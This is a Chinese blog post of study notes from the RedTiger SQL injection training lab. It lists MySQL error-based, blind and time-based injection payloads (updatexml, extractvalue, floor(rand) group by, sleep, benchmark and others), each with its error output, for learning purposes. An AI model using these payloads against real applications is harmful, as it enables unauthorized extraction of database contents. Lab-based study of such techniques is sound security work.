<!doctype html><html lang=zh><head><meta charset=UTF-8><meta content="IE=edge" http-equiv=X-UA-Compatible><meta content="text/html; charset=UTF-8" http-equiv=content-type><meta content="width=device-width,initial-scale=1,user-scalable=no" name=viewport><meta content="index, follow" name=robots><title>redtiger靶场训练笔记</title><meta content=redtiger靶场训练笔记 name=title><meta content=一点点从这个世界上消失。 name=description><meta content=website property=og:type><meta content=https://nnnewb.github.io/posts/2022/redtiger-lab-training-notes/ property=og:url><meta content="weakptr's blog" property=og:site_name><meta content=redtiger靶场训练笔记 property=og:title><meta content=一点点从这个世界上消失。 property=og:description><meta content=https://nnnewb.github.io/image/favicon.ico property=og:image><meta content=summary_large_image property=twitter:card><meta content=https://nnnewb.github.io/posts/2022/redtiger-lab-training-notes/ property=twitter:url><meta content=redtiger靶场训练笔记 property=twitter:title><meta content=一点点从这个世界上消失。 property=twitter:description><meta content=https://nnnewb.github.io/image/favicon.ico property=twitter:image><link href=https://nnnewb.github.io/posts/2022/redtiger-lab-training-notes/ rel=canonical><link rel="shortcut icon" href=https://nnnewb.github.io/image/favicon.ico type=image/x-icon><link href=https://nnnewb.github.io/css/reset.css rel=stylesheet><link href=https://nnnewb.github.io/css/pallete.css rel=stylesheet><link href=https://nnnewb.github.io/css/suCSS.css rel=stylesheet><link href=https://nnnewb.github.io/archive.css rel=stylesheet><link href=https://nnnewb.github.io/style.css rel=stylesheet><script defer src=https://nnnewb.github.io/js/script.js></script><link crossorigin href=https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.css integrity=sha384-9eLZqc9ds8eNjO3TmqPeYcDj8n+Qfa4nuSiGYa6DjLNcv9BtN69ZIulL9+8CqC9Y rel=stylesheet><script crossorigin defer integrity=sha384-K3vbOmF2BtaVai+Qk37uypf7VrgBubhQreNQe9aGsz9lB63dIFiQVlJbr92dw2Lx src=https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.js></script><script crossorigin defer integrity=sha384-zWYbd0NBwgTsgIdFKVprSfTh1mbMPe5Hz1X3yY4Sd1h/K1cQoUe36OGwAGz/PcDy src=https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/contrib/mathtex-script-type.min.js></script><script crossorigin defer integrity=sha384-kmZOZB5ObwgQnS/DuDg6TScgOiWWBiVt0plIRkZCmE6rDZGrEOQeHM5PcHi+nyqe src=https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/contrib/auto-render.min.js></script><script>document.addEventListener("DOMContentLoaded", function () {
        renderMathInElement(document.body, {
            // customised options
            // • auto-render specific keys, e.g.:
            delimiters: [
                { left: '$$', right: '$$', display: true },
                { left: '$', right: '$', display: false },
                { left: '\\(', right: '\\)', display: false },
                { left: '\\[', right: '\\]', display: false }
            ],
            // • rendering keys, e.g.:
            throwOnError: true
        });
    });</script><script src=https://cdn.jsdelivr.net/npm/mermaid@11.6.0/dist/mermaid.min.js></script><script>document.addEventListener('DOMContentLoaded', function () {
        // 查找所有具有 'pre' 标签且类名为 'language-mermaid' 的元素
        const mermaidElements = document.getElementsByClassName('language-mermaid');
        for (let i = 0; i < mermaidElements.length; i++) {
            const el = mermaidElements.item(i);
            if (el.tagName === "PRE" && !el.classList.contains('mermaid')) {
                el.innerHTML = el.textContent;
                el.classList.add('mermaid');
            }
        }

        mermaid.initialize({ startOnLoad: true, theme: 'dark', });
    })</script><script>if (window.location.hostname.toLowerCase() !== 'localhost' && window.location.hostname !== '127.0.0.1') {
        var _hmt = _hmt || [];
        (function () {
            var hm = document.createElement("script");
            hm.src = "https://hm.baidu.com/hm.js?dbb9df33a2de52aede8bccd84a7493ad";
            var s = document.getElementsByTagName("script")[0];
            s.parentNode.insertBefore(hm, s);
        })();
    }</script><link href=https://chinese-fonts-cdn.deno.dev/packages/lxgwwenkaibright/dist/LXGWBright-Medium/result.css rel=stylesheet><link href=https://chinese-fonts-cdn.deno.dev/packages/maple-mono-cn/dist/MapleMono-CN-Regular/result.css rel=stylesheet><body><header><nav id=nav-bar><a href=/> 首页 </a>  /  <a href=/posts/> 文章 </a>  /  <a href=/categories/> 分类 </a>  /  <a href=/tags/> 标签 </a>  /  <a href=/search/> 搜索 </a>  /  <div><input id=theme-toggle style=display:none type=checkbox><label for=theme-toggle id=theme-toggle-label><svg class=icons id=theme-icon><use href=https://nnnewb.github.io/icons.svg#lightMode></use></svg></label><audio id=theme-sound><source src=https://nnnewb.github.io/click.ogg type=audio/ogg></audio></div></nav></header><main><h1>redtiger靶场训练笔记</h1><p class=author-line>作于：2022-05-06 09:12 ，预计阅读时间 4 分钟<article><h2 id=qian-yan>前言</h2><p>靶场地址：http://redtiger.labs.overthewire.org/<p>按照靶场约定，不会直接给任何解。仅记录在这个靶场练习的时候学到的东西。<h2 id=error-based-sql-injection>error based SQL injection</h2><p>red tiger 靶场都是盲注，但还是要提一嘴。学到多少算多少。error based SQL injection 顾名思义要靠错误，所以前端有错误消息回显才有用。但盲注的时候依然能用到一些相关技巧。<h3 id=dang-qian-biao-lie-shu-liang>当前表列数量</h3><h4 id=group-by-fa>group by 法</h4><pre class=language-sql data-lang=sql style=color:#fdf4c1aa;background-color:#282828><code class=language-sql data-lang=sql><span style=color:#fa5c4b>select </span><span style=color:#fdf4c1>* </span><span style=color:#fa5c4b>from</span><span> users </span><span style=color:#fa5c4b>group by </span><span style=color:#d3869b>5</span><span>;
</span><span style=color:#928374;font-style:italic># SQL 错误 [1054] [42S22]: Unknown column '5' in 'group statement'
</span><span style=color:#928374;font-style:italic># 5 是列号，不存在列的时候报上面的错，需要自己枚举 1,2,3,4,5 直到确认。因为一次测一个真/假所以盲注的时候也能用。
</span></code></pre><h4 id=order-by-fa>order by 法</h4><pre class=language-sql data-lang=sql style=color:#fdf4c1aa;background-color:#282828><code class=language-sql data-lang=sql><span style=color:#fa5c4b>select </span><span style=color:#fdf4c1>* </span><span style=color:#fa5c4b>from</span><span> users </span><span style=color:#fa5c4b>order by </span><span style=color:#d3869b>1</span><span>,</span><span style=color:#d3869b>2</span><span>,</span><span style=color:#d3869b>3</span><span>,</span><span style=color:#d3869b>4</span><span>,</span><span style=color:#d3869b>5</span><span>,</span><span style=color:#d3869b>6</span><span>,</span><span style=color:#d3869b>7</span><span>,</span><span style=color:#d3869b>8</span><span>,</span><span style=color:#d3869b>9</span><span>,</span><span style=color:#d3869b>10</span><span>,</span><span style=color:#d3869b>11</span><span>,</span><span style=color:#d3869b>12</span><span>,</span><span style=color:#d3869b>13</span><span>,</span><span style=color:#d3869b>14</span><span>,</span><span style=color:#d3869b>15</span><span>;
</span><span style=color:#928374;font-style:italic># SQL 错误 [1054] [42S22]: Unknown column '3' in 'order clause'
</span><span style=color:#928374;font-style:italic># 3 是列号，order by 法一次可以枚举很多列，大多时候可以一次拿到当前表的列数。不过盲注的时候不行。可以用来缩小范围。
</span></code></pre><h4 id=zi-cha-xun-fa>子查询法</h4><pre class=language-sql data-lang=sql style=color:#fdf4c1aa;background-color:#282828><code class=language-sql data-lang=sql><span style=color:#fa5c4b>select </span><span style=color:#fdf4c1>* </span><span style=color:#fa5c4b>from</span><span> users </span><span style=color:#fa5c4b>where</span><span> (</span><span style=color:#fa5c4b>SELECT </span><span style=color:#fdf4c1>* </span><span style=color:#fa5c4b>from</span><span> users)</span><span style=color:#fe8019>=</span><span>(</span><span style=color:#d3869b>1</span><span>,</span><span style=color:#d3869b>2</span><span>);
</span><span style=color:#928374;font-style:italic># SQL 错误 [1241] [21000]: Operand should contain 2 column(s)
</span><span style=color:#928374;font-style:italic># 这个方法直接爆出有几个列，但要求知道表名
</span></code></pre><h4 id=union-fa>union 法</h4><pre class=language-sql data-lang=sql style=color:#fdf4c1aa;background-color:#282828><code class=language-sql data-lang=sql><span style=color:#fa5c4b>select </span><span style=color:#fdf4c1>* </span><span style=color:#fa5c4b>from</span><span> users </span><span style=color:#fa5c4b>union all select </span><span style=color:#d3869b>1</span><span>,</span><span style=color:#d3869b>2</span><span>,</span><span style=color:#d3869b>3</span><span>,</span><span style=color:#d3869b>NULL</span><span>,</span><span style=color:#d3869b>NULL</span><span>,</span><span style=color:#d3869b>NULL</span><span>,</span><span style=color:#d3869b>NULL</span><span>,</span><span style=color:#d3869b>NULL</span><span>,</span><span style=color:#d3869b>NULL 
</span><span style=color:#928374;font-style:italic># (types of columns must match or be of derived types or NULL)
</span><span style=color:#928374;font-style:italic># SQL 错误 [1222] [21000]: The used SELECT statements have a different number of columns
</span><span style=color:#928374;font-style:italic># 利用 union 查询列数量必须相等来确定左侧查询的列数量，如果左侧是 select * 的话那 union 查询枚举的列数量就是表里列的数量
</span></code></pre><h3 id=huo-qu-lie-ming>获取列名</h3><h4 id=union-notnull>union+notnull</h4><pre class=language-sql data-lang=sql style=color:#fdf4c1aa;background-color:#282828><code class=language-sql data-lang=sql><span style=color:#fa5c4b>select </span><span style=color:#fdf4c1>* </span><span style=color:#fa5c4b>from</span><span> users </span><span style=color:#fa5c4b>where</span><span> (</span><span style=color:#d3869b>1</span><span>,</span><span style=color:#d3869b>2</span><span>,</span><span style=color:#d3869b>3</span><span>) </span><span style=color:#fe8019>=</span><span> (</span><span style=color:#fa5c4b>select </span><span style=color:#fdf4c1>* </span><span style=color:#fa5c4b>from</span><span> users </span><span style=color:#fa5c4b>union all select </span><span style=color:#d3869b>1</span><span>%</span><span style=color:#d3869b>0</span><span>,</span><span style=color:#d3869b>2</span><span>,</span><span style=color:#d3869b>3</span><span>);
</span><span style=color:#928374;font-style:italic># Error: Column 'id' cannot be null
</span><span style=color:#928374;font-style:italic># 实测发现在 MySQL 5.7 中不好使了，会出现 SQL 错误 [1242] [21000]: Subquery returns more than 1 row
</span></code></pre><h4 id=insert>insert</h4><pre class=language-sql data-lang=sql style=color:#fdf4c1aa;background-color:#282828><code class=language-sql data-lang=sql><span style=color:#fa5c4b>insert into</span><span> users (id,username,passwd) </span><span style=color:#fa5c4b>values</span><span> (if(</span><span style=color:#d3869b>1</span><span style=color:#fe8019>=</span><span style=color:#d3869b>1</span><span>,</span><span style=color:#d3869b>NULL</span><span>,</span><span style=color:#b8bb26>'1'</span><span>), </span><span style=color:#b8bb26>'2'</span><span>,</span><span style=color:#b8bb26>'3'</span><span>)
</span><span style=color:#928374;font-style:italic># Error: Column 'id' cannot be null
</span><span style=color:#928374;font-style:italic># 要先得到列名，。而且实测 MySQL 5.7 里对主键+自增+非空，即使直接insert null 也会成功。
</span></code></pre><h4 id=join>join</h4><pre class=language-sql data-lang=sql style=color:#fdf4c1aa;background-color:#282828><code class=language-sql data-lang=sql><span style=color:#fa5c4b>select </span><span style=color:#fdf4c1>* </span><span style=color:#fa5c4b>from</span><span> (</span><span style=color:#fa5c4b>select </span><span style=color:#fdf4c1>* </span><span style=color:#fa5c4b>from</span><span> users </span><span style=color:#fa5c4b>JOIN</span><span> users a)b;
</span><span style=color:#928374;font-style:italic># Error: Duplicate column name 'id'
</span><span style=color:#928374;font-style:italic># 同样失效了。MySQL 5.7 下会返回重复的列名。
</span></code></pre><h3 id=huo-qu-zhi>获取值</h3><h4 id=count-floor-rand-0-2-group-by>count floor(rand(0)*2) group by</h4><pre class=language-sql data-lang=sql style=color:#fdf4c1aa;background-color:#282828><code class=language-sql data-lang=sql><span style=color:#fa5c4b>select </span><span style=color:#fabd2f>COUNT</span><span>(</span><span style=color:#fdf4c1>*</span><span>), CONCAT(version(), FLOOR(RAND(</span><span style=color:#d3869b>0</span><span>)</span><span style=color:#fdf4c1>*</span><span style=color:#d3869b>2</span><span>) )x </span><span style=color:#fa5c4b>from</span><span> users </span><span style=color:#fa5c4b>GROUP BY</span><span> x;
</span><span style=color:#928374;font-style:italic># SQL 错误 [1062] [23000]: Duplicate entry '5.7.331' for key '&lt;group_key>'
</span><span style=color:#928374;font-style:italic># 需要注意的是 COUNT(*) 不能少
</span></code></pre><blockquote><p><em>Works because mysql insides executes this query by making two queries: add count of x into temp table and if error (x value does not exist) then insert x value (second time x calculation) into table</em></blockquote><h4 id=bigint-unsigned>BIGINT UNSIGNED</h4><pre class=language-sql data-lang=sql style=color:#fdf4c1aa;background-color:#282828><code class=language-sql data-lang=sql><span style=color:#fa5c4b>select</span><span> !(</span><span style=color:#fa5c4b>select </span><span style=color:#fdf4c1>* </span><span style=color:#fa5c4b>from</span><span> (</span><span style=color:#fa5c4b>select</span><span> version())x) </span><span style=color:#fe8019>-</span><span> ~</span><span style=color:#d3869b>0</span><span>;
</span><span style=color:#928374;font-style:italic># 在 MySQL 5.7 不起效。
</span><span style=color:#928374;font-style:italic># BIGINT UNSIGNED value is out of range in '((not((select `x`.`version()` from (select version() AS `version()`) `x`))) - ~(0))'
</span></code></pre><p>不过还存在一个能爆出列名的 payload。<pre class=language-sql data-lang=sql style=color:#fdf4c1aa;background-color:#282828><code class=language-sql data-lang=sql><span style=color:#fa5c4b>select </span><span style=color:#d3869b>2 </span><span style=color:#fdf4c1>*</span><span> if((</span><span style=color:#fa5c4b>select </span><span style=color:#fdf4c1>* </span><span style=color:#fa5c4b>from</span><span> test </span><span style=color:#fa5c4b>limit </span><span style=color:#d3869b>1</span><span>) </span><span style=color:#fe8019>></span><span> (</span><span style=color:#fa5c4b>select </span><span style=color:#fdf4c1>* </span><span style=color:#fa5c4b>from</span><span> test </span><span style=color:#fa5c4b>limit </span><span style=color:#d3869b>1</span><span>), </span><span style=color:#d3869b>18446744073709551610</span><span>, </span><span style=color:#d3869b>18446744073709551610</span><span>);
</span><span style=color:#928374;font-style:italic># 注意 18446744073709551610 就是 ~0
</span><span style=color:#928374;font-style:italic># SQL 错误 [1690] [22001]: Data truncation: BIGINT UNSIGNED value is out of range in '(2 * if(((select `test`.`test`.`id`,`test`.`test`.`name` from `test`.`test` limit 1) > (select `test`.`test`.`id`,`test`.`test`.`name` from `test`.`test` limit 1)),18446744073709551610,18446744073709551610))'
</span><span style=color:#928374;font-style:italic># 这里会把 select * 展开成具体列名
</span></code></pre><h4 id=updatexml>updatexml</h4><pre class=language-sql data-lang=sql style=color:#fdf4c1aa;background-color:#282828><code class=language-sql data-lang=sql><span style=color:#fa5c4b>select</span><span> updatexml(</span><span style=color:#d3869b>1</span><span>, concat(</span><span style=color:#b8bb26>'~'</span><span>, version()), </span><span style=color:#d3869b>1</span><span>);
</span><span style=color:#928374;font-style:italic># SQL 错误 [1105] [HY000]: XPATH syntax error: '~5.7.33'
</span></code></pre><h4 id=extractvalue>extractvalue</h4><pre class=language-sql data-lang=sql style=color:#fdf4c1aa;background-color:#282828><code class=language-sql data-lang=sql><span style=color:#fa5c4b>select</span><span> extractvalue(</span><span style=color:#d3869b>1</span><span>, concat(</span><span style=color:#b8bb26>'~'</span><span>, version()));
</span><span style=color:#928374;font-style:italic># SQL 错误 [1105] [HY000]: XPATH syntax error: '~5.7.33'
</span></code></pre><h4 id=st-longfromgeohash>ST_LongFromGeoHash</h4><pre class=language-sql data-lang=sql style=color:#fdf4c1aa;background-color:#282828><code class=language-sql data-lang=sql><span style=color:#fa5c4b>select</span><span> ST_LongFromGeoHash(version());
</span><span style=color:#928374;font-style:italic># MySQL >= 5.7.5
</span><span style=color:#928374;font-style:italic># SQL 错误 [1411] [HY000]: Incorrect geohash value: '5.7.33' for function ST_LONGFROMGEOHASH
</span></code></pre><h2 id=blind-sql-injection>blind SQL injection</h2><p>两个技巧。<h3 id=if-substring-ascii-char>if/substring/ascii/char</h3><p>灵活运用 <code>if</code>、<code>substring</code>、<code>ascii</code>、<code>char</code> 这些函数。<pre class=language-sql data-lang=sql style=color:#fdf4c1aa;background-color:#282828><code class=language-sql data-lang=sql><span style=color:#fa5c4b>SELECT </span><span style=color:#fdf4c1>* </span><span style=color:#fa5c4b>FROM</span><span> test </span><span style=color:#fa5c4b>WHERE</span><span> id</span><span style=color:#fe8019>=</span><span style=color:#d3869b>0 </span><span style=color:#fe8019>OR</span><span> IF(FIND_IN_SET(</span><span style=color:#fabd2f>substring</span><span>(version(),</span><span style=color:#d3869b>1</span><span>,</span><span style=color:#d3869b>1</span><span>),</span><span style=color:#b8bb26>'0,1,2,3,4,5'</span><span>),</span><span style=color:#d3869b>TRUE</span><span>,</span><span style=color:#d3869b>FALSE</span><span>);
</span></code></pre><p><code>ascii</code>和<code>char</code>两个函数主要是解决不能注入字符串之类的问题。<pre class=language-sql data-lang=sql style=color:#fdf4c1aa;background-color:#282828><code class=language-sql data-lang=sql><span style=color:#fa5c4b>SELECT </span><span style=color:#fdf4c1>* </span><span style=color:#fa5c4b>FROM</span><span> test </span><span style=color:#fa5c4b>WHERE</span><span> id </span><span style=color:#fe8019>= </span><span style=color:#d3869b>0 </span><span style=color:#fe8019>OR</span><span> ascii(</span><span style=color:#fabd2f>substring</span><span>(version(), </span><span style=color:#d3869b>1</span><span>, </span><span style=color:#d3869b>1</span><span>)) </span><span style=color:#fe8019>IN</span><span> (</span><span style=color:#d3869b>48</span><span>,</span><span style=color:#d3869b>49</span><span>,</span><span style=color:#d3869b>50</span><span>,</span><span style=color:#d3869b>51</span><span>,</span><span style=color:#d3869b>52</span><span>,</span><span style=color:#d3869b>53</span><span>);
</span></code></pre><p>这样就能完全避免注入的SQL里包含<code>'</code>，对过滤 <code>'</code>的 WAF 大概会有用。<p>此外其他的返回布尔值的函数多少在合适的地方还是能一战的吧。<h3 id=order-by>order by</h3><pre class=language-sql data-lang=sql style=color:#fdf4c1aa;background-color:#282828><code class=language-sql data-lang=sql><span style=color:#fa5c4b>SELECT </span><span style=color:#fdf4c1>* </span><span style=color:#fa5c4b>FROM</span><span> test </span><span style=color:#fa5c4b>ORDER BY</span><span> (id</span><span style=color:#fdf4c1>*</span><span>IF (ASCII(</span><span style=color:#fabd2f>substring</span><span>(VERSION(),</span><span style=color:#d3869b>1</span><span>,</span><span style=color:#d3869b>1</span><span>))</span><span style=color:#fe8019>=</span><span style=color:#d3869b>53</span><span>,</span><span style=color:#d3869b>1</span><span>,</span><span style=color:#fe8019>-</span><span style=color:#d3869b>1</span><span>)) ;
</span></code></pre><p>注入点在 <code>order by</code> 子句的时候比较有用。<h3 id=find-in-set>find_in_set</h3><p>这个就是纯 trick 了。用 <code>find_in_set</code> 可以一次判断更大的范围，减少请求次数。比如原本测试字符串一位就要跑字母表26个字母，算上大小写直接翻倍。<code>find_in_set</code>可以用的话就能实现二分法搜索，时间复杂度骤降。<h2 id=time-based-sql-injection>Time based SQL injection</h2><p>也叫 <em>double blind SQL injection</em>， 双盲指的是就连SQL执行结果都看不到。不管传什么都返回完全相同的页面。这种情况只能靠请求时间来判断了。<h3 id=sleep>sleep</h3><pre class=language-sql data-lang=sql style=color:#fdf4c1aa;background-color:#282828><code class=language-sql data-lang=sql><span style=color:#fa5c4b>select</span><span> if(version() </span><span style=color:#fe8019>like </span><span style=color:#b8bb26>'5%'</span><span>, sleep(</span><span style=color:#d3869b>10</span><span>), </span><span style=color:#d3869b>false</span><span>);
</span></code></pre><p>不必多解释了吧。<h3 id=benchmark>benchmark</h3><pre class=language-sql data-lang=sql style=color:#fdf4c1aa;background-color:#282828><code class=language-sql data-lang=sql><span style=color:#fa5c4b>select</span><span> benchmark (</span><span style=color:#d3869b>10000000</span><span>, md5(now()));
</span></code></pre><p>这种做法叫 <code>heavy queries</code>，就是给MySQL一个压力很大的查询，让MySQL花更长时间执行。除了 <code>benchmark</code> 之外还可以用 cross join ，求两个大表的笛卡尔积。cross join 时算法类似下面这样：<pre class=language-go data-lang=go style=color:#fdf4c1aa;background-color:#282828><code class=language-go data-lang=go><span style=color:#fa5c4b>for </span><span style=color:#fdf4c1>r1 </span><span style=color:#fe8019>:= </span><span style=color:#fa5c4b>range </span><span style=color:#fdf4c1>table1 </span><span>{
</span><span>    </span><span style=color:#fa5c4b>for </span><span style=color:#fdf4c1>r2 </span><span style=color:#fe8019>:= </span><span style=color:#fa5c4b>range </span><span style=color:#fdf4c1>table2 </span><span>{
</span><span>        </span><span style=color:#fdf4c1>results </span><span style=color:#fe8019>= </span><span style=color:#fabd2f>append</span><span>(</span><span style=color:#fdf4c1>results</span><span>, </span><span style=color:#fdf4c1>pair</span><span>(</span><span style=color:#fdf4c1>r1</span><span>,</span><span style=color:#fdf4c1>r2</span><span>))
</span><span>    }
</span><span>}
</span></code></pre><p>计算量等于两个表行数的积。不过前提是要知道表名，最少知道自己的表名，起码还能 JOIN 自己。如果数据量太少的话这个方法产生的返回时间差不够明显，就不能用了。<h2 id=can-kao>参考</h2><ul><li><a href=https://dev.mysql.com/doc/refman/5.7/en/json-function-reference.html>MySQL 5.7 Manual - JSON function reference</a><li><a href=https://phonexicum.github.io/infosec/sql-injection.html>phonexicum.github.io SQLi</a></ul><h2 id=si-kao>思考</h2><p>red tiger 的 level 1 和 level 2 真的很简单。选择正确的位置注入就能直接 pass，不需要考虑 bypass WAF，没有 trick。<p>level 3 开始就比较狗了，提示 try to get an error，但这句话不是让你往 error based SQL injection 的方向想，我就给带歪了，还想着怎么制造个能回显的注入 payload ，实际上根本不是这个意思。正确的方向是 制造一个 <strong>PHP的错误</strong>，解密 <code>usr</code> 这个参数。<p>具体就不说了，总之制造 PHP 的错误也需要动 <code>usr</code> ，我给的关键词是 type error，提示很明显了。<h2 id=zong-jie>总结</h2><p>以上，玩得开心。</article><p class=tags-data><a href=/tags/security>/security/</a> <a href=/tags/redtiger>/redtiger/</a></p><script data-repo-id="MDEwOlJlcG9zaXRvcnkzOTg0ODYyMTg=" async crossorigin data-category=Announcements data-category-id=DIC_kwDOF8Bqys4Cegmn data-emit-metadata=0 data-input-position=bottom data-lang=zh-CN data-mapping=pathname data-reactions-enabled=1 data-repo=nnnewb/nnnewb.github.io data-strict=0 data-theme=noborder_light id=giscus_script src=https://giscus.app/client.js></script></main><footer><hr><div id=footer-container><div><p style=text-align:center>Copyright © 2018-2024 weakptr <a href=mailto:weak_ptr@outlook.com>&lt;weak_ptr@outlook.com></a><p style=text-align:center>Built with <a rel="noopener noreferrer" href=https://www.getzola.org target=_blank>Zola</a> using <a rel="noopener noreferrer" href=https://github.com/Speyll/anemone target=_blank>anemone</a> theme, <a rel="noopener noreferrer" href=https://speyll.github.io/suCSS/ target=_blank>suCSS</a> framework & <a rel="noopener noreferrer" href=https://github.com/Speyll/veqev target=_blank>veqev</a>, modified by <a rel="noopener noreferrer" href=https://github.com/nnnewb/ target=_blank>nnnewb</a>.<p style=text-align:center>Theme and color theme licensed under <a rel="noopener noreferrer" href=https://en.wikipedia.org/wiki/Licence_MIT target=_blank>MIT</a>.</div></div></footer>